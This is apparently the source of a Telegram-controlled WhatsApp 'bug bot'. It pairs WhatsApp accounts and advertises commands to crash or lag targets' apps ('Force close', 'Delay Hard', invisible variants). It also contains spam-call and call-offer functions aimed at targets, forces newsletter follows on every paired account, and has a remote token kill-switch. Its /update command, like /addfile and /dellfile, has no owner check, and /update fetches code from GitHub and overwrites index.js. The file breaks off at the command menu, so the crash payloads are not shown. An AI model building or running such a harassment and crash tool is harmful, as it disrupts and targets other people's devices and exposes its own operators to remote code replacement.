const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  aretargetsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  targetDecode,
  mentionedtarget,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("xatabail");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/anything-101/Version3/refs/heads/main/Ridzz.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` JANGAN LUPA MASUK GB INFO SCRIPT⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.setMyCommands([
  { command: '/start', description: 'Developer Tercinta RidzzOffc' }
]).then(() => {
    console.log('Daftar perintah berhasil diperbarui!');
}).catch((error) => {
    console.error('Gagal memperbarui perintah:', error);
});

function startBot() {
  console.log(chalk.red(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

`));


console.log(chalk.greenBright(`
┌─────────────────────────────┐
❈ ⚠️あなたのトークンが認識されました、バン。  
├─────────────────────────────┤
❈ DEVELOPER : @Fadzzid & @RidzzOffc
❈ DESCRIPTION : Welcome New User
└─────────────────────────────┘
`));

console.log(chalk.blueBright(`
[ -_- ⚔️ -_- ]
`
));
};

/*validateToken(); 
buat validate token kalo lu mau kasih db nya*/
validateToken();
// buat start tanpa db kalo mau stary tanpa db tinggal ubah jadi startBot
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363301087120650@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ ᴋᴇ ɴᴏᴍᴏʀ ɪɴɪ ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ ᴋᴇ ɴᴏᴍᴏʀ ɪɴɪ  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ ɢᴀɢᴀʟ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴘᴀɪʀɪɴɢ, sɪʟᴀʜᴋᴀɴ ᴄᴏʙᴀ ʟᴀɢɪ ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ ᴋᴇʟᴀᴢ ʙᴀɴɢ, ᴘᴀɪʀɪɴɢ ᴋᴇ ɴᴏᴍᴏʀ ɪɴɪ ${botNumber}..... sᴜᴋsᴇs ᴋᴏɴᴇᴋ ʙᴀɴɢ\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363301087120650@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`◇ sᴜᴄᴄᴇs ᴘᴀɪʀɪɴɢ, ᴄᴏɴɴᴇᴄᴛ ʏᴏᴜʀ ᴄᴏᴅᴇ\`\`\`
ʏᴏᴜʀ ᴄᴏᴅᴇ : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ ɢᴀɢᴀʟ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴘᴀɪʀɪɴɢ ᴋᴇ ɴᴏᴍᴏʀ ɪɴɪ  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
// ~SEMANGAT RENAME NYA BY RidzzOffc

// NGAPA IN SIH?? 🥱
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~AMBIL SPEED AJA GUNA GK GUNA AMPOS
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

// BUAT TANGGAL TANGGALAN
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/eg5zg4.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// CD DI SINI YA MEK

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function spamcall(target) {
  // Inisialisasi koneksi dengan makeWASocket
  const sock = makeWASocket({
    printQRInTerminal: false, // QR code tidak perlu ditampilkan
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    // Kirim permintaan panggilan
    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners(); // Hapus semua event listener
    sock.ws.close(); // Tutup koneksi WebSocket
  }
}

async function sendOfferCall(target) {
  try {
    await sock.offerCall(target);
    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}

async function sendOfferVideoCall(target) {
  try {
    await sock.offerCall(target, {
      video: true,
    });
    console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
  } catch (error) {
    console.error(
      chalk.white.bold(`Failed Send Offer Video Call To Target:`, error)
    );
  }
}


//=============(TOOLS AUTOUPDATE)========\\
const fsp = fs.promises;
// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return cfg && typeof cfg === "object" ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "anything-101";
const DEFAULT_REPO = UPD.github_repo_default || "Autoupdate";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn =
  global.fetch ||
  ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(
    dir,
    `.update_tmp_${Date.now()}_${path.basename(targetPath)}`
  );
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, {
    headers: { "User-Agent": "ntba-update-bot" },
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(
      `Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`
    );
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error(
      "Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write)."
    );
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "ntba-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    // 404 => create baru
    if (!String(e.message).includes(" 404")) throw e;
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== NTBA HELPERS (ctx.reply replacement) ==================
async function send(chatId, text, opts = {}) {
  return bot.sendMessage(chatId, text, opts);
}

// Ambil args dari "/cmd@bot arg1 arg2"
function parseArgsFromMatch(matchArr) {
  const full = (matchArr && matchArr[0]) ? String(matchArr[0]) : "";
  const noCmd = full.replace(/^\/\w+(@\w+)?\s*/i, "");
  return noCmd.trim() ? noCmd.trim().split(/\s+/) : [];
}

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
bot.onText(/^\/update(@\w+)?(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const parts = parseArgsFromMatch(match);
    const repo = parts[0] || DEFAULT_REPO;

    await send(chatId, "🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
    await send(
      chatId,
      `⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`,
      { parse_mode: "Markdown" }
    );

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
    }

    // backup index.js lama
    try {
      const backup = path.join(process.cwd(), "index.backup.js");
      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await send(chatId, "✅ Update berhasil diterapkan.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 3000);
  } catch (err) {
    await send(chatId, `❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfile <repo> (reply file .js)
bot.onText(/^\/addfile(@\w+)?(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const parts = parseArgsFromMatch(match);
    const repo = parts[0] || DEFAULT_REPO;

    const replied = msg.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return send(
        chatId,
        "❌ Reply file .js dulu, lalu ketik:\n/addfile <namerepo>\nContoh: /addfile Pullupdate"
      );
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return send(chatId, "❌ File harus .js");

    await send(
      chatId,
      `⬆️ Uploading *${fileName}* ke repo *${repo}*...`,
      { parse_mode: "Markdown" }
    );

    // NTBA: cara ambil link file
    const fileInfo = await bot.getFile(doc.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${fileInfo.file_path}`;

    const res = await fetchFn(fileUrl);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await send(
      chatId,
      `✅ Berhasil upload *${fileName}* ke repo *${repo}*`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    await send(chatId, `❌ Gagal: ${err.message || String(err)}`);
  }
});

// /dellfile <repo> <path/file.js>
bot.onText(/^\/dellfile(@\w+)?(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const parts = parseArgsFromMatch(match);
    const repo = parts[0] || DEFAULT_REPO;
    const file = parts[1];

    if (!file) {
      return send(
        chatId,
        "Format:\n/dellfile <namerepo> <namefiles>\nContoh: /dellfile Pullupdate index.js"
      );
    }

    await send(
      chatId,
      `🗑️ Menghapus *${file}* di repo *${repo}*...`,
      { parse_mode: "Markdown" }
    );

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await send(
      chatId,
      `✅ Berhasil hapus *${file}* di repo *${repo}*`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    await send(chatId, `❌ Gagal: ${err.message || String(err)}`);
  }
});

bot.onText(/^\/restart$/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!OWNER_ID.includes(String(senderId))) {
    return bot.sendMessage(chatId, "❌ Lu bukan owner.");
  }

  await bot.sendMessage(chatId, "♻️ Restarting bot...");

  setTimeout(() => {
    const args = [...process.argv.slice(1), "--restarted-from", String(chatId)];
    const child = exec(process.argv[0], args, {
      detached: true,
      stdio: "inherit",
    });
    child.unref();
    process.exit(0);
  }, 1000);
});


//------------------------------------------------------------------------------------------------------------------------------\\
//------------------------------------------------------------------------------------------------------------------------------\\

// NGAPAIN DI MT MANAGER BG 🤔

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};

// Map untuk menampung interval agar bisa dihentikan saat pesan dihapus
const buttonIntervals = new Map();

// ===============================
// MENU UTAMA
// ===============================
async function sendStartMenu(chatId, from) {

  const userId = from.id;
  const username = from.username ? `@${from.username}` : "Tidak ada username";
  const randomImage = getRandomImage();
  let index = 0;

  const keyboard = [
    [
      { text: "🔙 BACK", callback_data: "tols" },
      { text: "👑 OWNER", url: "https://t.me/RidzzOffc" },
      { text: "NEXT ▶️", callback_data: "trashmenu" }
    ]
  ];

  const sent = await bot.sendPhoto(chatId, randomImage, {
    caption: `
\`\`\`
╭──────────────────────────────╮
│        EXPLANTION ORION                 │
╰──────────────────────────────╯
⎔ Developer : @RidzzOffc & @Fadzzid  
⎔ Version   : 1.0  
⎔ Platform  : Telegram  
⎔ Script    : Bebas Spam Bugs And not bebas spam 

YOUR INFORMATION
⎔ ID        : \`${userId}\`  
⎔ Username  : ${username}

STATUS SENDER
⎔ Koneksi   : ${sessions.size}
──────────────────────────────
        EXPLANTION X ORION
──────────────────────────────
\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  });

  const messageId = sent.message_id;

  const intervalId = setInterval(async () => {

    index++;
     index = 0;

    const keyboard = [
      [
        { text: "🔙 BACK", callback_data: "tols" },
        { text: "👑 OWNER", url: "https://t.me/Fadzzid" },
        { text: "NEXT ▶️", callback_data: "trashmenu" }
      ]
    ];

    try {

      await bot.editMessageReplyMarkup(
        { inline_keyboard: keyboard },
        {
          chat_id: chatId,
          message_id: messageId
        }
      );

    } catch (e) {
      clearInterval(intervalId);
    }

  }, 2000);

  buttonIntervals.set(messageId, intervalId);

}


// ===============================
// COMMAND START
// ===============================
bot.onText(/\/start/, async (msg) => {
  await sendStartMenu(msg.chat.id, msg.from);
});


// ===============================
// CALLBACK QUERY
// ===============================
bot.on("callback_query", async (query) => {

  try {

    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const runtime = getBotRuntime();
    const data = query.data;

    if (buttonIntervals.has(messageId)) {
      clearInterval(buttonIntervals.get(messageId));
      buttonIntervals.delete(messageId);
    }

    await bot.deleteMessage(chatId, messageId).catch(() => {});

    let caption = "";
    let replyMarkup = {};
    let selectedImage = "";


// ===============================
// MENU VISIBLE
// ===============================
if (data === "trashmenu") {

selectedImage = "https://files.catbox.moe/eg5zg4.jpg";

caption = `
\`\`\`js
╭──────────────────────────────╮
│        EXPLANTION ORION                │
╰──────────────────────────────╯
⎔ Developer : @RidzzOffc & @Fadzzid  
⎔ Version   : 1.0  
⎔ Platform  : Telegram  
⎔ Script    : Bebas Spam Bugs And not bebas spam 

YOUR INFORMATION
⎔ ID        : \`${userId}\`  
⎔ Username  : ${username}

STATUS SENDER
⎔ Koneksi   : ${sessions.size}

╭──── VISIBLE BUG ANDROID ────╮
│ ❈ /Xspam   [Delay spam]
│ ❈ /SuperSpam  [Delay super spam]
│ ❈ /Xshow  [Delay Visible]
│ ❈ /Xdelay  [Delay Hard]
│ ❈ /Xexplantion [Force close]
│ ❈ /Xorion [Force close Hard]
╰─────────────────────────────╯

╭──── INVISIBLE BUG MENU ────╮
│ ❈ /xdelay [ Delay bebas spam ]
│ ❈ /xsuper  [ Delay Bebas Spam V2 ]
│ ❈ /Cover  [Delay invisible Hard]
│ ❈ /Sexven  [Force close invisible Hard]
